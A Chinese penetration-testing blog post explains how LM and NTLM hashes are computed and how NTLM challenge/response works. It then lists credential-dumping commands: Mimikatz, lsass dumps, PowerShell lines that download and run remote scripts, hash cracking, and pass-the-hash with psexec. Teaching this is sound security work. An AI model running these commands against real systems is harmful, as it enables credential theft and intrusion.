@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网渗透-NTML身份认证 | BaiKer</title><meta name="keywords" content="安全机制,身份认证,NTML"><meta name="author" content="BaiKer"><meta name="copyright" content="BaiKer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介NTML（NT LAN Manager）是问询&#x2F;应答身份验证协议。 NTML 与 Kerberos 是 Windows 中最常见的两种网络认证协议 NTML 版本NTML V1 NTML V2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-NTML身份认证">
+<meta property="og:url" content="http://baiker.top/155adebd63bd.html">
+<meta property="og:site_name" content="BaiKer">
+<meta property="og:description" content="简介NTML（NT LAN Manager）是问询&#x2F;应答身份验证协议。 NTML 与 Kerberos 是 Windows 中最常见的两种网络认证协议 NTML 版本NTML V1 NTML V2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baiker.top/img/wallhaven-gj977q.png">
+<meta property="article:published_time" content="2021-11-25T08:20:31.000Z">
+<meta property="article:modified_time" content="2021-11-29T08:32:02.632Z">
+<meta property="article:author" content="BaiKer">
+<meta property="article:tag" content="安全机制">
+<meta property="article:tag" content="身份认证">
+<meta property="article:tag" content="NTML">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baiker.top/img/wallhaven-gj977q.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://baiker.top/155adebd63bd"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"TWYY6OLZHR","apiKey":"55f52a4f27b68086a202f7f911366f0d","indexName":"boke","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透-NTML身份认证',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-11-29 16:32:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="referrer" content="no-referrer" /><link rel="stylesheet" href="https://baiker.top/css/essay.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.css"/><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/essay"><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://baiker.top/img/wallhaven-gj977q.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BaiKer</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/essay"><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透-NTML身份认证</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-25T08:20:31.000Z" title="发表于 2021-11-25 16:20:31">2021-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-29T08:32:02.632Z" title="更新于 2021-11-29 16:32:02">2021-11-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">安全机制</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透-NTML身份认证"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>NTML（NT LAN Manager）是问询/应答身份验证协议。</p>
+<p>NTML 与 Kerberos 是 Windows 中最常见的两种网络认证协议</p>
+<h2 id="NTML-版本"><a href="#NTML-版本" class="headerlink" title="NTML 版本"></a>NTML 版本</h2><p>NTML V1</p>
+<p>NTML V2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </p>
+<p>NTLM session V2</p>
+<h2 id="NTML-本地认证"><a href="#NTML-本地认证" class="headerlink" title="NTML 本地认证"></a>NTML 本地认证</h2><p>Windows 不储存用户的明文密码，它会将明文密码经过加密后存储在 SAM ( <em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
+<blockquote>
+<p>  SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p>
+</blockquote>
+<p>在本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <code>NTML Hash</code>，与 <code>SAM</code> 数据库中的 <code>NTML Hash</code> 进行比较，从而实现认证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先，用户注销、重启、锁屏后，操作系统会让  <code>winlogon.exe</code> 显示登录界面，也就是输入框，接收输入后，将密码交给  <code>lsass.exe</code> 进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比     SAM 数据库中的 Hash 进行验证。</p>
+<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>LM Hash（LM Manager Hash） 是一种古老的 Hash，在 LAN Manager 协议中使用，在2003版本之后不再使用</p>
+<p>LM NTML 的加密方式如下：</p>
+<blockquote>
+<p>  PassWord —-&gt; 大写转换 —-&gt; 转换为16进制 —-&gt; 分为两个 7 byte 的比特流 —-&gt; DES加密 —-&gt; 得到 LM  Hash</p>
+</blockquote>
+<p>例如：</p>
+<blockquote>
+<p>  admin -&gt; 大写转换 = ADMIN</p>
+<p>  ADMIN -&gt; 转换为14字节的16进制字符串 = 41 44 4d 49 4e 00 00 00 00 00 00 00 00 00 </p>
+<p>  41 44 4d 49 4e 00 00 00 00 00 00 00 00 00 -&gt; 转换为两个 7byte 的比特流 (二进制) </p>
+<p>  41 44 4d 49 4e 00 00  -&gt; 转换为比特流（二进制）</p>
+<p>  01000001 01000100 01001101 01001001 01001110 00000000 00000000</p>
+<p>  00 00 00 00 00 00 00  -&gt; 转换为比特流（二进制）</p>
+<p>  00000000 00000000 00000000 00000000 00000000 00000000 00000000</p>
+<p>  若没有56bit，补足为56bit，1 byte 等于 8bit</p>
+<p>  在每一个字节后面末尾补0</p>
+<p>  01000000 10100010 00010010 10101000 10010100 01110000 00000000 00000000</p>
+<p>  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</p>
+<p>  把他们转换为8byte的16进制</p>
+<p>  40 a2 12 a8 94 70 00 00</p>
+<p>  00 00 00 00 00 00 00 00</p>
+<p>  使用字符串 KGS!@#$% 进行 DES 加密</p>
+<p>  这里需要把十六进制转换为字符串后进行加密</p>
+<p>  40 a2 12 a8 94 70 00 00 -&gt; DES = F0D412BD764FFE81</p>
+<p>  00 00 00 00 00 00 00 00 -&gt; DES = AAD3B435B51404EE</p>
+<p>  最后拼接起来，就是最终的32位 LM Hash</p>
+<p>  F0D412BD764FFE81AAD3B435B51404EE</p>
+</blockquote>
+<h3 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a>NTML Hash</h3><p>NTML Hash（NT LAN Manager） 是 NTML 网络认证协议的凭证</p>
+<p>是支持 NET NTML 认证协议及 本地认证 过程中的一个重要参数，长度为32位，由数字与字母组成。</p>
+<p>NTML Hash 是指存储在 <code>SAM</code> 数据库及 <code>NTDS.dit数据库</code> 中对密码进行 Hash 计算后的结果，这类的 Hash 可直接用于 PTH，并且存在于 <code>lsass.exe</code> 进程中，便于 NTML SSP （NTML 安全支持提供程序）使用 </p>
+<p>NTML Hash 的加密方式如下</p>
+<blockquote>
+<p>  PassWord —-&gt; 十六进制编码 —-&gt; Unicode转换 —-&gt; MD4加密 —-&gt; 得到NTLM Hash</p>
+</blockquote>
+<p>例如：</p>
+<blockquote>
+<p>  admin -&gt; hex(16进制编码) = 61646d696e</p>
+<p>  61646d696e -&gt; Unicode（’utf-16le’） = b’a\x00d\x00m\x00i\x00n\x00’</p>
+<p>  b’a\x00d\x00m\x00i\x00n\x00’ -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</p>
+</blockquote>
+<p>在网络上的文章中，会把Unicode之后的结果再进行一次16进制的转换</p>
+<blockquote>
+<p>  b’a\x00d\x00m\x00i\x00n\x00’ -&gt; hex(16进制编码) = 610064006d0069006e00</p>
+</blockquote>
+<p>这样做便于阅读，但是实际上是直接把Unicode之后的结果直接进行MD4加密</p>
+<h2 id="NTML-网络认证"><a href="#NTML-网络认证" class="headerlink" title="NTML 网络认证"></a>NTML 网络认证</h2><h3 id="NTML-身份验证"><a href="#NTML-身份验证" class="headerlink" title="NTML 身份验证"></a>NTML 身份验证</h3><p>NTML 身份认证采用的是<code>Challenge(质疑)/Response(响应)</code>验证机制</p>
+<p>NTML 通过三部分组成：</p>
+<ul>
+<li>  <strong>协商（TYPE 1 Negotiate）</strong></li>
+<li>  <strong>质询（TYPE 2 Challenge）</strong></li>
+<li>  <strong>身份验证（TYPE 3 Authenticate）</strong></li>
+</ul>
+<p>（1）首先，如果客户端需要访问服务器的某个服务是需要进行身份认证的。于是，客户端要输入服务器的用户名和密码进行验证，此时客户端本地会缓存一份服务器密码的 NTLM Hash 值。</p>
+<p>客户端发送 <strong>TYPE 1 Negotiate</strong> 协商消息去协商需要认证的主体，用户（服务器端的用户名），机器以及需要使用的安全服务等信息。</p>
+<p>（2）服务端接收到客户端发送过来的 TYPE 1 消息后，会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等。然后传入 NTLM SSP，得到 <strong>TYPE 2 Challenge</strong> 消息（被称为 Challenge 质询消息），并将此 TYPE 2 消息发回给客户端。</p>
+<p>这个 TYPE 2 消息中包含了一个由服务端生成的 16 位随机值，此随机值被称为 Challenge，服务器也会将该 Challenge 保存起来。</p>
+<p>（3）客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 <strong>Net-NTLMHash</strong>，最后将 <strong>Net NTLM-Hash</strong> 封装到 <strong>TYPE 3 Authenticate</strong> 消息中（被称为 Authenticate 认证消息），发往服务端。</p>
+<p>（4）服务器在收到 TYPE 3 的消息之后，用自己的密码的 NTLM-Hash 对 Challenge 进行加密，并比较自己计算出的 Net NTLM-Hash 认证消息和客户端发送的认证消息是否匹配。</p>
+<p>如果用户Hash是存储在域控里面，那么就没有办法计算服务器的 Net NTLM-Hash，这个时候用户服务器就会通过 Netlogon 协议联系域控，建立一个安全通道，然后将type 1,type 2,type 3全部发送给域控（这个过程也叫做 Pass Through Authentication 认证流程），最后域控再计算出 Net NTLM-Hash，与 type 3 进行比较</p>
+<p>如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败</p>
+<h3 id="网络认证版本差异"><a href="#网络认证版本差异" class="headerlink" title="网络认证版本差异"></a>网络认证版本差异</h3><ul>
+<li>challenge<ul>
+<li>  V1：8-byte</li>
+<li>  V2：16-byte</li>
+</ul>
+</li>
+<li>Net-NTML Hash<ul>
+<li>  V1：DES</li>
+<li>  V2：HMAC-MD5</li>
+</ul>
+</li>
+</ul>
+<h3 id="Net-NTML-Hash"><a href="#Net-NTML-Hash" class="headerlink" title="Net-NTML Hash"></a>Net-NTML Hash</h3><p>Net-NTML Hash 是NTML协议在网络认证过程中，对本地NTML Hash 进行加密的协议</p>
+<h4 id="Net-NTML-Hash-V1"><a href="#Net-NTML-Hash-V1" class="headerlink" title="Net-NTML Hash V1"></a>Net-NTML Hash V1</h4><blockquote>
+<p>  NTML Hash -&gt; 分为三组7字节 -&gt; 使用DES加密 Challenge = 拼接三组得到Net-NTML Hash</p>
+</blockquote>
+<h4 id="Net-NTML-Hash-V2"><a href="#Net-NTML-Hash-V2" class="headerlink" title="Net-NTML Hash V2"></a>Net-NTML Hash V2</h4><blockquote>
+<p>  NTML Hash -&gt; 使用 HMAC-MD5 加密 Challenge  = Net-NTML Hash</p>
+</blockquote>
+<h2 id="本地-Hash-获取"><a href="#本地-Hash-获取" class="headerlink" title="本地 Hash 获取"></a>本地 Hash 获取</h2><h3 id="Quarks-PwDump-工具"><a href="#Quarks-PwDump-工具" class="headerlink" title="Quarks PwDump 工具"></a>Quarks PwDump 工具</h3><p>需要手动编译</p>
+<p><a target="_blank" rel="noopener" href="https://blog.quarkslab.com/quarks-pwdump.html">https://blog.quarkslab.com/quarks-pwdump.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quarkspwdump.exe <span class="literal">-dhl</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Mimikatz-工具"><a href="#Mimikatz-工具" class="headerlink" title="Mimikatz 工具"></a>Mimikatz 工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<p>内存读取密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p>注册表 读取密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam D:\sam.hive</span><br><span class="line">reg save hklm\sam D:\system.hive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">lsadump::sam /sam:sam.hiv /system:system.hiv</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="转储LSASS进程"><a href="#转储LSASS进程" class="headerlink" title="转储LSASS进程"></a>转储LSASS进程</h3><h4 id="prodump-工具"><a href="#prodump-工具" class="headerlink" title="prodump 工具"></a>prodump 工具</h4><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;</span>); <span class="string">&quot;Get-Process lsass | Out-Minidump&quot;</span></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(‘https://github.com/samratashok/nishang/blob/master/Gather/<span class="built_in">Get-PassHashes</span>.ps1<span class="string">&#x27;);Get-PassHashes</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="任务管理器"><a href="#任务管理器" class="headerlink" title="任务管理器"></a>任务管理器</h4><p>右键-创建转储文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Temp\lsass.DMP</span><br></pre></td></tr></table></figure>
+
+<h4 id="分析-lass-dmp文件"><a href="#分析-lass-dmp文件" class="headerlink" title="分析 lass.dmp文件"></a>分析 lass.dmp文件</h4><p>Mimikatz 工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="本地-Hash-解密"><a href="#本地-Hash-解密" class="headerlink" title="本地 Hash 解密"></a>本地 Hash 解密</h2><p>John 工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/openwall/john">https://github.com/openwall/john</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/4366899658/">https://www.freesion.com/article/4366899658/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john xxx.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Hashcat</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat-m 1000 -a 0 -o winpassok.txt win.hash password.lst --username</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="PTH-哈希传递攻击"><a href="#PTH-哈希传递攻击" class="headerlink" title="PTH 哈希传递攻击"></a>PTH 哈希传递攻击</h2><h3 id="PTH（Pass-The-Hash）-简介"><a href="#PTH（Pass-The-Hash）-简介" class="headerlink" title="PTH（Pass-The-Hash） 简介"></a>PTH（Pass-The-Hash） 简介</h3><p>PTH（Pass-The-Hash）哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术</p>
+<p>前提：</p>
+<p>抓取管理员的密码、NTLM Hash</p>
+<ul>
+<li>  认证的用户名 （质询第一步需要）</li>
+<li>  认证用户的NTLM Hash</li>
+</ul>
+<h3 id="PTH（Pass-The-Hash）-原理"><a href="#PTH（Pass-The-Hash）-原理" class="headerlink" title="PTH（Pass-The-Hash） 原理"></a>PTH（Pass-The-Hash） 原理</h3><p>在type3计算response的时候，客户端是使用用户的hash进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户hash</p>
+<h3 id="PTH（Pass-The-Hash）-利用"><a href="#PTH（Pass-The-Hash）-利用" class="headerlink" title="PTH（Pass-The-Hash） 利用"></a>PTH（Pass-The-Hash） 利用</h3><p><strong>mimikatz 交互式获取</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:域用户 /domain:域 /ntlm:Hash值</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>psexec</strong></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<p>有exe和python两个版本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe admin@<span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-hashes</span> <span class="number">624</span>aac413795cdc1a5c7b1e00f780017:<span class="number">852</span>a844adfce18f66009b4f14e0a98de </span><br><span class="line"></span><br><span class="line">psexec.py  administrator@<span class="number">192.168</span>.<span class="number">1.1</span>   <span class="literal">-hashes</span> <span class="number">624</span>aac413795cdc1a5c7b1e00f780017:<span class="number">852</span>a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure>
+
